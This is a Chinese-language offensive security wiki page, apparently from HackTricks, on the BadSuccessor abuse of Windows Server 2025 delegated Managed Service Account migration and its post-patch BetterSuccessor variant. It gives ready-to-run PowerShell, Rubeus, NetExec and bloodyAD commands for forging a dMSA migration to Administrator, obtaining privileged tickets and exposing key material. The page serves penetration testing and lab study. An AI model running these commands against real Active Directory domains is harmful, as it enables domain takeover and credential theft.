# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## 概述

**BadSuccessor** 滥用 **Windows Server 2025** 引入的 **delegated Managed Service Account**（**dMSA**）迁移工作流。dMSA 可以通过 **`msDS-ManagedAccountPrecededByLink`** 链接到旧账户，并通过存储在 **`msDS-DelegatedMSAState`** 中的迁移状态进行迁移。如果攻击者能够在可写 OU 中创建 dMSA 并控制这些属性，KDC 就可以为攻击者控制的 dMSA 签发具有**被链接账户授权上下文**的票据。<sup>[[2]](#references)</sup>

实际上，这意味着低权限用户即使只有委派的 OU 权限，也可以创建新的 dMSA，将其指向 `Administrator`，完成迁移状态，然后获取 PAC 中包含 **Domain Admins** 等特权组的 TGT。<sup>[[2]](#references)</sup>

## 重要的 dMSA 迁移细节

- dMSA 是 **Windows Server 2025** 的功能。
- `Start-ADServiceAccountMigration` 会将迁移设置为**已启动**状态。
- `Complete-ADServiceAccountMigration` 会将迁移设置为**已完成**状态。
- `msDS-DelegatedMSAState = 1` 表示迁移已启动。
- `msDS-DelegatedMSAState = 2` 表示迁移已完成。
- 在合法迁移过程中，dMSA 旨在透明地取代被替代的账户，因此 KDC/LSA 会保留原账户已有的访问权限。<sup>[[3]](#references)</sup>

Microsoft Learn 还指出，在迁移过程中，原账户会与 dMSA 关联，并且 dMSA 旨在访问旧账户能够访问的资源。<sup>[[3]](#references)</sup> 这正是 BadSuccessor 所滥用的安全假设。<sup>[[2]](#references)</sup>

## 要求

1. 域中存在 **dMSA**，也就是说，AD 端支持 **Windows Server 2025**。
2. 攻击者可以在某个 OU 中**创建** `msDS-DelegatedManagedServiceAccount` 对象，或在该 OU 中拥有等效的广泛子对象创建权限。
3. 攻击者可以**写入**相关 dMSA 属性，或完全控制自己刚创建的 dMSA。
4. 攻击者可以从已加入域的环境中请求 Kerberos 票据，或通过能够访问 LDAP/Kerberos 的隧道请求票据。<sup>[[2]](#references)</sup>

### 实际检查

最直接的操作者信号是验证域/林级别，并确认环境已经在使用新的 Server 2025 技术栈：

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

如果看到 `Windows2025Domain` 和 `Windows2025Forest` 之类的值，请优先检查 **BadSuccessor / dMSA migration abuse**。

你也可以使用公开工具枚举被委派了 dMSA 创建权限且可写的 OU：<sup>[[1]](#references)</sup>

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## 滥用流程

1. 在你拥有委派创建子对象权限的 OU 中创建一个 dMSA。
2. 将 **`msDS-ManagedAccountPrecededByLink`** 设置为特权目标的 DN，例如 `CN=Administrator,CN=Users,DC=corp,DC=local`。
3. 将 **`msDS-DelegatedMSAState`** 设置为 `2`，标记迁移已完成。
4. 为新的 dMSA 请求 TGT，并使用返回的票据访问特权服务。<sup>[[2]](#references)</sup>

PowerShell 示例：<sup>[[2]](#references)</sup>

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

票据请求 / 运维工具示例：<sup>[[1]](#references)[[2]](#references)</sup>

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## 为什么这不只是权限提升

在合法迁移期间，Windows 还需要让新的 dMSA 处理切换前为旧账户签发的票据。这就是为什么与 dMSA 相关的票据材料在 **`KERB-DMSA-KEY-PACKAGE`** 流程中可能包含**当前**和**之前的**密钥。<sup>[[2]](#references)</sup>

对于攻击者控制的伪造迁移，这种行为可能让 BadSuccessor 变成：<sup>[[2]](#references)</sup>

- 通过在 PAC 中继承特权组 SID 来实现**权限提升**。
- **凭据材料泄露**，因为在存在漏洞的工作流中，处理之前的密钥可能会暴露与前任账户的 RC4/NT hash 等效的材料。

因此，这种技术既可用于直接接管域，也可用于后续操作，例如 pass-the-hash 或更广泛的凭据入侵。

## KDC 修补后的 BetterSuccessor

修补后的 KDC 会验证 dMSA 迁移的双方。除了检查 dMSA 的 `msDS-ManagedAccountPrecededByLink` 和迁移状态外，前任账户还必须通过 `msDS-SupersededManagedAccountLink` 指回该 dMSA，并具有兼容的 `msDS-SupersededServiceAccountState`。单向链接现在会失败；只能创建 dMSA 的账户无法指定任意前任账户。如果攻击者同时拥有 OU 中 dMSA 的 `CreateChild` 权限，**并且**对所选目标账户的迁移属性具有有效写入权限，就可以建立互惠链接。由此生成的 dMSA 票据可以携带前任账户的授权上下文，并在 dMSA key package 中暴露其密钥。这是一条定向的凭据访问/权限放大路径，并不能证明原先针对任意目标的 BadSuccessor 在已修补的 DC 上仍可利用。<sup>[[5]](#references)[[6]](#references)</sup>

在已确认可以写入目标账户的实验环境中，`bloodyAD` 可以创建 dMSA 并执行成对的迁移写入。使用返回的 Kerberos 材料请求 dMSA 票据，并检查目标账户的实际权限，再判断其权限或 hash 是否已成功获取。工具的 `badSuccessor` 子命令名称并不意味着未修补版本的单向行为仍然存在。<sup>[[7]](#references)</sup>

```bash
KRB5CCNAME=operator.ccache bloodyAD -d example.local --host dc.example.local -k add badSuccessor test_dmsa --ou 'OU=DMSAHolder,DC=example,DC=local' -t 'CN=Target User,OU=Users,DC=example,DC=local'
```

## 补丁状态说明

原始的 BadSuccessor 行为**并非只是 2025 年的理论预览问题**。Microsoft 为其分配了 **CVE-2025-53779**，并于 **2025 年 8 月**发布了安全更新。<sup>[[4]](#references)</sup> 请继续记录此攻击，以用于：

- **labs / CTFs / assume-breach 演练**
- **尚未修补的 Windows Server 2025 环境**
- **评估期间验证 OU 委派和 dMSA 暴露情况**

不要仅因 Windows Server 2025 域中存在 dMSA，就认定该域存在漏洞；请核实补丁级别并谨慎测试。

## 工具

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB：Eighteen - 利用 BadSuccessor dMSA 滥用获取 Domain Admin 权限 (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor：滥用 dMSA 提升 Active Directory 中的权限](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Delegated Managed Service Accounts 概述](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [5] [Akamai - BadSuccessor 已死，BadSuccessor 万岁（？）](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
- [6] [Altered Security - BetterSuccessor：补丁之后仍可滥用 dMSA](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
- [7] [0xdf - HTB：Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../../banners/hacktricks-training.md}}
